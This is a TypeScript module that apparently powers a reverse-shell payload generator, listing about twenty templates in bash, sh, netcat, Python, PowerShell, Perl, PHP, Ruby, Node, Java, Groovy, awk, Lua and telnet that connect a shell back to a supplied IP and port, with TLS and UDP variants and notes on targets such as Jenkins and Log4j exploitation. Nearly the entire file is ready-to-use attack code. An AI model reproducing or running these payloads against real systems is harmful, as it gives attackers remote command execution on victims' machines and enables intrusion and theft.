export type OS = "linux" | "windows" | "macos" | "any";
export type Transport = "tcp" | "udp" | "http" | "https" | "dns";
export type Language =
  | "bash"
  | "sh"
  | "python"
  | "perl"
  | "php"
  | "ruby"
  | "node"
  | "powershell"
  | "netcat"
  | "awk"
  | "telnet"
  | "java"
  | "groovy"
  | "lua";

export interface PayloadTemplate {
  id: string;
  name: string;
  language: Language;
  os: OS;
  transport: Transport;
  description: string;
  tags: string[];
  build: (vars: PayloadVars) => string;
  listener: "nc" | "socat" | "pwncat" | "metasploit" | "custom";
}

export interface PayloadVars {
  ip?: string;
  port?: number;
  lhost?: string;
  lport?: number;
  rhost?: string;
  rport?: number;
  useragent?: string;
}

function resolve(vars: PayloadVars): { ip: string; port: number } {
  const ip = vars.ip || vars.lhost || "10.0.0.1";
  const port = vars.port || vars.lport || 4444;
  return { ip, port };
}

export const PAYLOAD_TEMPLATES: PayloadTemplate[] = [
  {
    id: "bash-tcp",
    name: "Bash TCP",
    language: "bash",
    os: "linux",
    transport: "tcp",
    description: "Classic bash /dev/tcp reverse shell. Requires bash (not sh).",
    tags: ["one-liner", "no-special-chars"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    },
  },
  {
    id: "sh-tcp-shovel",
    name: "sh (TCP), netcat shovel",
    language: "sh",
    os: "linux",
    transport: "tcp",
    description: "POSIX sh using nc as a bidirectional shovel. Works on busybox/Alpine.",
    tags: ["posix", "busybox"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/f`;
    },
  },
  {
    id: "bash-udp",
    name: "Bash UDP",
    language: "bash",
    os: "linux",
    transport: "udp",
    description: "Bash reverse over UDP via /dev/udp. Listener must speak UDP.",
    tags: ["one-liner"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `bash -i >& /dev/udp/${ip}/${port} 0>&1`;
    },
  },
  {
    id: "py-tcp-short",
    name: "Python TCP (short)",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Compact python one-liner. Cross-platform (py2/py3 compatible-ish).",
    tags: ["one-liner"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
    },
  },
  {
    id: "py3-tcp-staged",
    name: "Python 3 TCP (staged)",
    language: "python",
    os: "any",
    transport: "tcp",
    description: "Multi-line python 3 with proper PTY. Better stability on Linux/macOS.",
    tags: ["multi-line", "pty"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import os,pty,socket
s=socket.socket()
s.connect(("${ip}",${port}))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
'`;
    },
  },
  {
    id: "py-https",
    name: "Python HTTPS",
    language: "python",
    os: "any",
    transport: "https",
    description: "Python reverse over TLS. Listener must be a TLS endpoint (openssl/socat).",
    tags: ["tls", "egress-friendly"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `python3 -c '
import ssl,socket,subprocess
ctx=ssl.create_default_context()
ctx.check_hostname=False
ctx.verify_mode=ssl.CERT_NONE
s=ctx.wrap_socket(socket.socket(),server_hostname="${ip}")
s.connect(("${ip}",${port}))
p=subprocess.Popen(["/bin/sh"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())
p.wait()
'`;
    },
  },
  {
    id: "ps-tcp",
    name: "PowerShell TCP",
    language: "powershell",
    os: "windows",
    transport: "tcp",
    description: "Pure TCP reverse shell via .NET TcpClient. No modules required.",
    tags: ["windows", "no-modules"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `$client = New-Object System.Net.Sockets.TcpClient('${ip}',${port});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
  $sendback = (iex $data 2>&1 | Out-String );
  $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
  $stream.Write($sendbyte,0,$sendbyte.Length);
  $stream.Flush();
};
$client.Close();`;
    },
  },
  {
    id: "ps-https",
    name: "PowerShell HTTPS",
    language: "powershell",
    os: "windows",
    transport: "https",
    description: "TLS reverse shell. Bypasses default certificate validation.",
    tags: ["windows", "tls"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
$client = New-Object System.Net.Sockets.TcpClient('${ip}',${port});
$ssl = New-Object System.Net.Security.SslStream($client.GetStream(),$false,({$true}));
$ssl.AuthenticateAsClient('${ip}');
$bytes = New-Object byte[] 65536;
while(($i = $ssl.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);
  $out = (iex $data 2>&1 | Out-String) + 'PS> ';
  $ssl.Write(([text.encoding]::ASCII.GetBytes($out)),0,$out.Length);
};`;
    },
  },
  {
    id: "ps-conv",
    name: "PowerShell ConstrainedMode",
    language: "powershell",
    os: "windows",
    transport: "tcp",
    description: "Constrained Language Mode friendly payload for hardened hosts.",
    tags: ["windows", "clm-friendly"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `$ErrorActionPreference='SilentlyContinue';
$c=New-Object Net.Sockets.TcpClient('${ip}',${port});
$s=$c.GetStream();
[byte[]]$b=0..65535|%{0};
while(($r=$s.Read($b,0,$b.Length)) -ne 0){
  $d=[Text.Encoding]::ASCII.GetString($b,0,$r);
  $o=(iex $d 2>&1|Out-String);
  $s.Write([Text.Encoding]::ASCII.GetBytes($o),0,$o.Length);
};`;
    },
  },
  {
    id: "nc-traditional",
    name: "Netcat (traditional), -e",
    language: "netcat",
    os: "linux",
    transport: "tcp",
    description: "Classic nc -e. Only works on traditional nc builds (not OpenBSD).",
    tags: ["one-liner", "nc-traditional"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `nc -e /bin/sh ${ip} ${port}`;
    },
  },
  {
    id: "nc-fifo",
    name: "Netcat (any), fifo",
    language: "netcat",
    os: "linux",
    transport: "tcp",
    description: "Works on any nc flavor (OpenBSD, busybox). Uses a named fifo for bidirectional I/O.",
    tags: ["busybox", "openbsd-nc"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `rm -f /tmp/p; mkfifo /tmp/p; cat /tmp/p | /bin/sh -i 2>&1 | nc ${ip} ${port} > /tmp/p`;
    },
  },
  {
    id: "ncat-ssl",
    name: "Ncat SSL",
    language: "netcat",
    os: "linux",
    transport: "https",
    description: "Ncat with SSL. Encrypted reverse shell via ncat (Nmap suite).",
    tags: ["tls", "ncat"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `ncat --ssl ${ip} ${port} -e /bin/sh`;
    },
  },
  {
    id: "perl-tcp",
    name: "Perl TCP",
    language: "perl",
    os: "linux",
    transport: "tcp",
    description: "Classic perl reverse shell. Works on most Unix hosts with perl installed.",
    tags: ["one-liner"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `perl -e 'use Socket;socket(S,2,1,0);connect(S,pack_sockaddr_in(${port},inet_aton("${ip}")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh")'`;
    },
  },
  {
    id: "perl-udp",
    name: "Perl UDP",
    language: "perl",
    os: "linux",
    transport: "udp",
    description: "Perl reverse over UDP via SOCK_DGRAM. Listener must speak UDP.",
    tags: ["udp"],
    listener: "socat",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `perl -e 'use Socket;socket(S,2,2,0);connect(S,pack_sockaddr_in(${port},inet_aton("${ip}")));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh")'`;
    },
  },
  {
    id: "php-tcp",
    name: "PHP TCP",
    language: "php",
    os: "any",
    transport: "tcp",
    description: "Standard php reverse shell via fsockopen. Common in web RCE.",
    tags: ["webshell-friendly"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    },
  },
  {
    id: "ruby-tcp",
    name: "Ruby TCP",
    language: "ruby",
    os: "linux",
    transport: "tcp",
    description: "Standard ruby reverse shell. Useful on Ruby-on-Rails RCE.",
    tags: ["rails"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `ruby -rsocket -e 'exit if fork;c=TCPSocket.new("${ip}","${port}");while(cmd=c.gets);IO.popen(cmd.to_s,"r+"){|io|c.print io.read} end'`;
    },
  },
  {
    id: "node-tcp",
    name: "Node.js TCP",
    language: "node",
    os: "any",
    transport: "tcp",
    description: "Node.js reverse shell via net.Socket. Useful on Electron / SSRF.",
    tags: ["node", "electron"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `node -e 'const{spawn}=require("child_process");const net=require("net");const s=new net.Socket();s.connect(${port},"${ip}",()=>{const p=spawn("/bin/sh",[]);p.stdout.pipe(s);p.stderr.pipe(s);s.pipe(p.stdin);});'`;
    },
  },
  {
    id: "java-tcp",
    name: "Java TCP",
    language: "java",
    os: "any",
    transport: "tcp",
    description: "Java reverse shell via ProcessBuilder. Common on Spring/Log4j RCE.",
    tags: ["spring", "log4j"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `public class Rev {
  public static void main(String[] a) throws Exception {
    String host="${ip}";int p=${port};
    Process pr=Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/"+host+"/"+p+" 2>&1; cat <&5 | while read l; do eval \\"$l\\"; done"});
    pr.waitFor();
  }
}`;
    },
  },
  {
    id: "groovy-tcp",
    name: "Groovy TCP",
    language: "groovy",
    os: "any",
    transport: "tcp",
    description: "Groovy reverse shell. Jenkins Script Console favorite.",
    tags: ["jenkins"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `String host="${ip}";
int port=${port};
String cmd="/bin/sh";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){so.write(pi.read());po.write(si.read());so.flush();po.flush();}`;
    },
  },
  {
    id: "awk-tcp",
    name: "AWK TCP",
    language: "awk",
    os: "linux",
    transport: "tcp",
    description: "Last-resort awk shell. Useful when nothing else is available.",
    tags: ["fallback"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `awk 'BEGIN { s="/inet/tcp/0/${ip}/${port}"; while(1) { printf "$ "; cmd |& getline out; print out |& s; close(s); } }'`;
    },
  },
  {
    id: "lua-tcp",
    name: "Lua TCP",
    language: "lua",
    os: "linux",
    transport: "tcp",
    description: "Lua reverse shell. Useful on embedded systems and some routers.",
    tags: ["embedded"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `lua -e 'require("socket");require("os");require("io");s=socket.tcp();s:connect("${ip}",${port});os.execute("/bin/sh -i <&"..s:getfd().." >&"..s:getfd().." 2>&"..s:getfd())'`;
    },
  },
  {
    id: "telnet-fifo",
    name: "Telnet (fifo)",
    language: "telnet",
    os: "linux",
    transport: "tcp",
    description: "Telnet-based reverse shell via named pipe.",
    tags: ["fallback", "busybox"],
    listener: "nc",
    build: (v) => {
      const { ip, port } = resolve(v);
      return `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | telnet ${ip} ${port} > /tmp/f`;
    },
  },
];

export function filterTemplates(opts: {
  language?: Language;
  os?: OS;
  transport?: Transport;
}): PayloadTemplate[] {
  return PAYLOAD_TEMPLATES.filter((t) => {
    if (opts.language && t.language !== opts.language) return false;
    if (opts.os && t.os !== opts.os && t.os !== "any") return false;
    if (opts.transport && t.transport !== opts.transport) return false;
    return true;
  });
}

export function getTemplateById(id: string): PayloadTemplate | undefined {
  return PAYLOAD_TEMPLATES.find((t) => t.id === id);
}
